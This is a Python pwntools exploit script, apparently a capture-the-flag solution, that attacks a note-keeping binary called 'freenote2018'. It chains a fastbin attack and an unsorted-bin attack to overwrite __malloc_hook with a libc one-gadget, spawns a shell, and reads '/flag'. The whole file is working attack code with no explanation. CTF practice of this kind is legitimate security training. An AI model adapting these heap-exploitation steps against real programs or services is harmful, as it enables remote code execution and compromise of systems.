#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

import os
import sys
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'debug'

L = True # local or remote
E = False#False # set env

if E or not L:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

BINARY = './freenote2018'
 
#code = ELF(BINARY)
#libc = ELF(LIBC64)

if L:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})
else:
    r = remote('0.0.0.0',2333)

def init(length):
    r.sendlineafter('Choice:', '1')
    r.sendlineafter('length:', str(length))
    r.sendlineafter('content:', '')

def edit(idx,data):
    r.sendlineafter('Choice:', '2')
    r.sendlineafter('index:', str(idx))
    r.sendafter('content:', data)

def free(idx):
    r.sendlineafter('Choice:', '3')
    r.sendlineafter('index:', str(idx))

#gdb.attach(r, execute='b *0x%x' % (0x0000555555554000+0x000000000000E48))
#gdb.attach(r, '')

try:
    init(101-8)#0
    init(201-8)#1
    init(101-8)#2
    #init(101-8)#3
    init(201-8)#3
    init(101-8)#4

    free(1)
    init(101-8)
    init(101-8)

    # fastbin attack
    free(1)
    free(2)
    edit(2, '\xe0')
    edit(6, '\xfd\x1a')

    init(101-8)#0
    init(101-8)#0
    init(101-8)#0

    # unsortbin attack
    free(3)
    edit(3, 'a'*8 + '\x00\x1b')

    # hijack __malloc_hook
    init(201-8)#

    edit(9, 'o'*3+p64(0x00007ffff7a0d000+0x4526a)[:3])
    init(201-8)#
    r.sendline('cat /flag')
    log.info(r.recvline())
    r.interactive()
except:
    r.close()

#r.interactive()
